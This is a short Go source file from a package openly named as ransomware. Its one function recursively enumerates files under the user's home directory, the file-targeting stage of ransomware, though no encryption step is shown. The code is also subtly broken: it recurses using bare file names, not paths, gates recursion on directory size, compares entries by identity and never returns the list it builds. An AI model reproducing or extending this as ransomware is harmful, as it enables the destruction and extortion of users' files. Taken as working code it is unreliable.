package ransomeware

import (
	"fmt"
	"io/fs"
	"io/ioutil"
	"log"
	"os"
)

func GetAllFiles() {
	var files []fs.FileInfo
	homeDir, err := os.UserHomeDir()
	if err != nil {
		log.Fatal(err)
	}
	homefiles, err := ioutil.ReadDir(homeDir)
	if err != nil {
		log.Fatal(err)
	}
	var extractAllFiles func(fs.FileInfo)
	extractAllFiles = func(file fs.FileInfo) {
		if file.IsDir() && file.Size() > 10 {
			fls, err := ioutil.ReadDir(file.Name())
			if err != nil {
				log.Fatal(err)
			}
			for _, f := range fls {
				extractAllFiles(f)
			}
		} else {
			if !ContainsFile(files, file) {
				files = append(files, file)
			}
		}
	}
	for _, file := range homefiles {
		extractAllFiles(file)
		fmt.Println(file.Name())
	}

}

func ContainsFile(files []fs.FileInfo, file fs.FileInfo) bool {
	for _, f := range files {
		if f == file {
			return true
		}
	}
	return false
}
